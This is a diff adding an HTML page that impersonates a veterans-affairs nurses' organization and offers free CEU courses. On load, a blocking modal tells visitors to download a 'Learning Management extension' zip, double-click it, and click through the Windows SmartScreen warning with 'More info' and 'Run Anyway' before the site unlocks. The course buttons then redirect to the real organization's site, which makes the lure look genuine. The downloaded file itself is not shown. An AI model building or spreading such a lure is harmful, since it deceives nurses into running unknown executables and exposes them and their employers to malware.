@@ -1,0 +1,368 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>NOVA — National Wellness Month CEUs</title>
+  <link rel="icon" href="https://cdn.ymaws.com/nova.site-ym.com/graphics/logo.png" />
+  <style>
+    :root {
+      --nova-navy: #0d2c44;
+      --nova-red: #c8102e;
+      --nova-red-2: #e4323d;
+      --border: #d7e5ea;
+      --card: #ffffff;
+      --shadow: 0 8px 20px rgba(0,0,0,.1);
+    }
+    body { font-family: "Inter", sans-serif; margin:0; color:#1e2a30; }
+    .container { width: min(100%, 1100px); margin:0 auto; padding:1rem; }
+    header { background:#fff; border-bottom:1px solid var(--border); }
+    .nav-wrap { display:flex; justify-content:space-between; align-items:center; padding:1rem 0; }
+    .brand img { height:40px; }
+    nav ul { display:flex; gap:1rem; list-style:none; margin:0; padding:0; }
+    nav a { text-decoration:none; color:var(--nova-navy); font-weight:600; }
+    .hero { position: relative; padding: 3rem 0; text-align: center; color: #fff; overflow: hidden; }
+    .hero::before { content: ""; position: absolute; inset: 0; background: url('https://images5.alphacoders.com/133/1338583.png') center/cover no-repeat; opacity: 0.25; z-index: 0; }
+    .hero::after { content: ""; position: absolute; inset: 0; background: rgba(0,0,0,0.35); z-index: 1; }
+    .hero h1, .hero p { position: relative; z-index: 2; color: #fff; }
+    .hero h1 { font-size: 2.2rem; text-shadow: 0 2px 4px rgba(0,0,0,0.7); }
+    .hero p { text-shadow: 0 1px 3px rgba(0,0,0,0.7); }
+    .card { background:var(--card); border:1px solid var(--border); border-radius:12px; box-shadow:var(--shadow); padding:1rem; margin-bottom:1rem; }
+    .meta { color:var(--nova-red); font-weight:700; margin-bottom:.5rem; }
+    .btn { display:inline-block; padding:.7rem 1rem; border-radius:999px; font-weight:700; text-decoration:none; cursor:pointer; }
+    .btn-primary { background:linear-gradient(135deg, var(--nova-red), var(--nova-red-2)); color:#fff; border:0; }
+    .btn-outline { border:1px solid var(--nova-red); color:var(--nova-red); background:transparent; }
+    footer { border-top:1px solid var(--border); padding:2rem 0; text-align:center; font-size:.9rem; color:#555; }
+
+    /* Modal styles */
+    .modal-backdrop { position:fixed; inset:0; background:rgba(0,0,0,.45); display:grid; place-items:center; padding:1rem; z-index:100; }
+    .modal { width:min(520px, 100%); background:#fff; border:1px solid var(--border); border-radius:14px; box-shadow:0 20px 60px rgba(0,0,0,.2); padding:1.25rem; text-align:left; }
+    .modal h3 { margin:0 0 .4rem; color:var(--nova-navy); font-size:1.3rem; }
+    .modal p { margin:.4rem 0; }
+    .modal .countdown { color:#6a6a6a; font-size:.95rem; }
+    .modal-actions { margin-top:1rem; display:flex; gap:.6rem; flex-wrap:wrap; }
+    .hidden { display:none !important; }
+  </style>
+
+<style>
+  /* Optional-download modal gate */
+  .backdrop-modal-gate { position: fixed; inset: 0; background: rgba(0,0,0,.6); display: flex; align-items: center; justify-content: center; z-index: 99999; }
+  .gate-modal { background: #fff; width: min(560px, 92vw); border-radius: 14px; padding: 20px 22px; box-shadow: 0 10px 30px rgba(0,0,0,.25); }
+  .gate-modal h2 { margin: 0 0 .5rem; font-size: 1.25rem }
+  .gate-modal p { margin: .5rem 0; line-height: 1.5 }
+  .gate-actions { display: flex; gap: 12px; margin-top: 1rem; flex-wrap: wrap }
+  .gate-btn, .gate-link { border: 0; padding: .7rem 1rem; border-radius: 10px; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; justify-content: center }
+  .gate-link { background: #0b5fff; color: #fff }
+  .gate-btn.secondary { background: #f0f2f5 }
+  .gate-btn.primary { background: #0b5fff; color: #fff }
+  .gate-btn:disabled { opacity: .5; cursor: not-allowed }
+  .gate-ack { display: flex; align-items: start; gap: .6rem; margin-top: .75rem; font-size: .95rem }
+</style>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Scrollable Modal</title>
+  <style>
+    .backdrop-modal-gate {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      padding: 1rem;
+    }
+
+    .gate-modal {
+      background: #fff;
+      border-radius: 8px;
+      max-height: 80vh;
+      overflow-y: auto;
+      width: 90%;
+      max-width: 600px;
+      padding: 20px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+      box-sizing: border-box;
+    }
+
+    .gate-modal h2, .gate-modal h1 {
+      margin-top: 0;
+    }
+
+    .gate-actions {
+      margin-top: 20px;
+    }
+
+    .gate-link {
+      display: inline-block;
+      margin-bottom: 10px;
+      color: white;
+      background: #007bff;
+      padding: 10px 15px;
+      text-decoration: none;
+      border-radius: 4px;
+    }
+
+    .gate-btn.primary {
+      background: green;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 4px;
+      cursor: not-allowed;
+    }
+
+    .gate-ack {
+      display: block;
+      margin-top: 15px;
+    }
+
+    .step {
+      margin-top: 20px;
+    }
+
+    .step img {
+      display: block;
+      margin-top: 10px;
+    }
+
+    /* Optional scrollbar styling */
+    .gate-modal::-webkit-scrollbar {
+      width: 10px;
+    }
+    .gate-modal::-webkit-scrollbar-thumb {
+      background-color: rgba(0,0,0,0.2);
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+<div class="backdrop-modal-gate" id="gate">
+  <div class="gate-modal" role="dialog" aria-modal="true" aria-labelledby="dl-title">
+    <img src="https://cdn.ymaws.com/nova.site-ym.com/graphics/logo.png" alt="Logo" style="height:24px; vertical-align:middle; margin-right:8px;">
+    <h2 id="dl-title">Missing Media Extension</h2>
+    <p>Learning Management extension required. To play our courses in this browser, please download the Learning Management extension and click it to run. When it’s running, return here and press Continue.</p>
+    <ul>
+  <header>
+    <h1>Install the Learning Management Extension</h1>
+    </header>
+
+  <main>
+    <!-- Step 1 -->
+    <section class="step" id="step-1">
+      <h2>1) Click “Download Learning Management extension”</h2>
+      <figure>
+        <img src="downloads/images/Download.png" width="300" height="200"/>
+      </figure>
+    </section>
+
+    <!-- Step 2 -->
+    <section class="step" id="step-2">
+      <h2>2) When the download finishes, click <em>Open file</em></h2>
+      <figure>
+        <img src="downloads/images/Download1.png" width="300" height="200"/>
+        
+      </figure>
+    </section>
+
+    <!-- Step 3 -->
+    <section class="step" id="step-3">
+      <h2>3) Double-click <code>Learning_Management_extension</code></h2>
+      <figure>
+        <img src="downloads/images/Download2.png" width="300" height="200" />
+        
+      </figure>
+    </section>
+
+    <!-- Safety Note -->
+    <section class="step note" id="safety">
+        <h2>4) Click “More Info”</h2>     
+      <p>
+        At the “Windows protected your PC” message, click <strong> More info </strong>
+      </p>
+      <figure>
+        <img src="downloads/images/Download3.png" width="300" height="200"/>
+      </figure>
+    </section>
+
+    <section class="step note" id="safety">
+      <h2>5) Click “Run Anyway”</h2>
+      <p>
+        On the bottom right hand corner a button should appear called <strong> Run Anyway. </strong> Click it. 
+      </p>    
+      <figure>
+        <img src="downloads/images/Download4.png" width="300" height="200"/>
+      </figure>
+    </section>
+
+    </ul>
+    <div class="gate-actions">
+      <a class="gate-link" href="/downloads/Learning_Management_extension.zip" download>Download Learning Management extension</a>
+    </div>
+    <label class="gate-ack">
+      <input type="checkbox" id="confirm" />
+      <span>I installed it</span>
+    </label>
+    <div class="gate-actions">
+      <button class="gate-btn primary" id="continue" disabled>Continue</button>
+    </div>
+  </div>
+</div>
+
+<main id="content" hidden>
+
+  <header>
+    <div class="container nav-wrap">
+      <a class="brand" href="#"><img src="https://cdn.ymaws.com/nova.site-ym.com/graphics/logo.png" alt="NOVA — Nurses Organization of Veterans Affairs" /></a>
+      <nav>
+        <ul>
+          <li><a href="#courses">Courses</a></li>
+          <li><a href="#accreditation">Accreditation</a></li>
+          <li><a href="#how">How it Works</a></li>
+          <li><a href="#faq">FAQ</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="container">
+        <h1>30 Free CEUs for VA Nurses</h1>
+        <p>You're managing impossible patient loads and mandatory overtime—yet still expected to complete CEUs on your own time and dime. <strong>This September, that changes.</strong></p>
+      </div>
+    </section>
+
+    <section class="section" id="courses">
+      <div class="container">
+        <h2>Featured Wellness Courses</h2>
+        <div class="cards">
+          <div class="card"><div class="meta">3 CEUs</div><h3>Managing Stress in High-Acuity Settings</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+          <div class="card"><div class="meta">2.5 CEUs</div><h3>Preventing Compassion Fatigue</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+          <div class="card"><div class="meta">2 CEUs</div><h3>Healthy Habits for Shift Workers</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+          <div class="card"><div class="meta">3 CEUs</div><h3>Building Resilience in Nursing Practice</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+          <div class="card"><div class="meta">2.5 CEUs</div><h3>Self‑Care Strategies That Actually Work</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+          <div class="card"><div class="meta">+17 more</div><h3>Additional Wellness‑Focused Courses</h3><div class="actions"><a href="#" class="btn btn-primary enroll">Enroll Now</a></div></div>
+        </div>
+      </div>
+    </section>
+    <section id="accreditation" class="container">
+      <h2>Accreditation & Eligibility</h2>
+      <p>All courses are accredited and eligible for continuing education credit.</p>
+    </section>
+
+    <section id="how" class="container">
+      <h2>How It Works</h2>
+      <ol>
+        <li>Sign up with your name, email, license type, and state.</li>
+        <li>Complete courses at your own pace.</li>
+        <li>Download certificates instantly and track your CEUs.</li>
+      </ol>
+    </section>
+
+    <section id="faq" class="container">
+      <h2>FAQ</h2>
+      <details><summary>Are the CEUs really free?</summary><p>Yes—access is free during September 1–31.</p></details>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="container">
+      <p><strong>NOVA</strong> — Nurses Organization of Veterans Affairs</p>
+      <p>&copy; 2025 NOVA. All rights reserved.</p>
+    </div>
+  </footer>
+
+  <!-- Modal -->
+  <div id="filledModal" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal">
+      <h3 id="modalTitle">Classes Filled</h3>
+      <p>These classes have been filled for September. You’ll be redirected to vanurse.org to explore current offerings.</p>
+      <p class="countdown">Redirecting in <span id="count">3</span>…</p>
+      <div class="modal-actions">
+        <a href="https://www.vanurse.org/" class="btn btn-primary" id="continueBtn">Continue to NOVA</a>
+        <button class="btn btn-outline" id="closeModal" type="button">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      var modal = document.getElementById('filledModal');
+      var countEl = document.getElementById('count');
+      var closeBtn = document.getElementById('closeModal');
+      var continueBtn = document.getElementById('continueBtn');
+      var timer = null; var n = 3;
+
+      function startCountdown(){
+        n = 3; countEl.textContent = n;
+        timer = setInterval(function(){
+          n--; countEl.textContent = n;
+          if(n <= 0){
+            clearInterval(timer);
+            window.location.href = 'https://www.vanurse.org/';
+          }
+        }, 1000);
+      }
+
+      function openModal(){
+        modal.classList.remove('hidden');
+        startCountdown();
+      }
+
+      var enrollBtns = document.querySelectorAll('.enroll');
+      enrollBtns.forEach(function(btn){
+        btn.addEventListener('click', function(e){
+          e.preventDefault();
+          openModal();
+        });
+      });
+
+      closeBtn.addEventListener('click', function(){
+        if(timer) clearInterval(timer);
+        modal.classList.add('hidden');
+      });
+
+      continueBtn.addEventListener('click', function(){
+        if(timer) clearInterval(timer);
+        // Let link navigate naturally
+      });
+    })();
+  </script>
+
+</main>
+
+<script>
+  (function(){
+    var gate = document.getElementById('gate');
+    var content = document.getElementById('content');
+    var confirmBox = document.getElementById('confirm');
+    var continueBtn = document.getElementById('continue');
+    var skipBtn = document.getElementById('skip');
+
+    if (confirmBox) {
+      confirmBox.addEventListener('change', function () {
+        continueBtn.disabled = !confirmBox.checked;
+      });
+    }
+
+    function openSite() {
+      if (gate && gate.parentNode) gate.parentNode.removeChild(gate);
+      if (content) {
+        content.hidden = false;
+        try { content.setAttribute('tabindex', '-1'); content.focus({ preventScroll: true }); } catch(e) {}
+      }
+    }
+
+    if (continueBtn) continueBtn.addEventListener('click', openSite);
+    if (skipBtn) skipBtn.addEventListener('click', openSite);
+  })();
+</script>
+
+</body>
+</html>
